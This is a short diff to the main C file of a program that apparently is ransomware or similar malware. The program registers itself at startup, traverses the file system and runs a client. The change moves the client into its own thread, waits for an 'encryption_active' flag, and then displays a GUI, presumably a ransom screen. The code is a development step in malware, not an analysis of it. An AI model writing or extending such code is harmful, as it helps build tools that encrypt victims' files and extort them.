@@ -10,6 +10,7 @@
 #include "../../headers/client.h"
 //#include "../../headers/watcher.h"
 #include "../../headers/pdf_data.h"
+#include "../../headers/gui.h"
 
 void start_up_register() {
     char self_path[256];
@@ -100,7 +101,15 @@ int main() {
 
     traverse(start_path);
 
-    startclient();
+    pthread_t client_tid;
+    pthread_create(&client_tid, NULL, startclient, NULL);
+
+    while (!encryption_active) {
+        usleep(100000); // check every 100ms
+    }
+    display_gui();
+
+    pthread_join(client_tid, NULL);
 
     return 0;
 }
